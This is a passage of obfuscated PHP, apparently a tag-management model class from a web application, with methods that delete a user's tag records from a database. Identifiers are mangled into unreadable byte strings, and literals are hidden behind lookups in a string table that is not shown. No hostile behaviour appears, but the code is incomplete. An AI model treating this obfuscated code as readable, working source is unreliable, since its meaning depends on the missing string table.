=> 0); if ($this->where($aÔ¥Íñ¹)->find()) { return !1; } return $this->add($aÔ¥Íñ¹); } protected function removeFromTag($D¶ãÒÇà…‘, $f­ƒÀª…šÅ) { $cƒÕÚãÎÆµ =& $_SERVER[»„]; if (!Model($cƒÕÚãÎÆµ[2280])->listData($f­ƒÀª…šÅ)) { return !1; } if (is_array($D¶ãÒÇà…‘)) { $D¶ãÒÇà…‘ = array($cƒÕÚãÎÆµ[7], $D¶ãÒÇà…‘); } $e§Õ’ÎÛ = array($cƒÕÚãÎÆµ[1400] => USER_ID, $cƒÕÚãÎÆµ[432] => $f­ƒÀª…šÅ, $cƒÕÚãÎÆµ[384] => $cƒÕÚãÎÆµ[378], $cƒÕÚãÎÆµ[383] => $D¶ãÒÇà…‘); return $this->where($e§Õ’ÎÛ)->delete(); } protected function removeByTag($c¡×Ş§Šİ‚) { $bÖíäó™ª =& $_SERVER[»„]; if (!$c¡×Ş§Šİ‚) { return !1; } $f¼Í±Í…‡ = array($bÖíäó™ª[1400] => USER_ID, $bÖíäó™ª[432] => $c¡×Ş§Šİ‚); return $this->where($f¼Í±Í…‡)->delete(); } protected function removeBySource($Bíˆ‘ÆŠä) { $EŸƒ˜×¡ì =& $_SERVER[»„]; $FÛ¨ÃŞ¯¤ = array($EŸƒ˜×¡ì[1400] => USER_ID, $EŸƒ˜×¡ì[383] => $Bíˆ‘ÆŠä, $EŸƒ˜×¡ì[432] => array($EŸƒ˜×¡ì[918], 0)); return $this->where($FÛ¨ÃŞ¯¤)->delete(); } }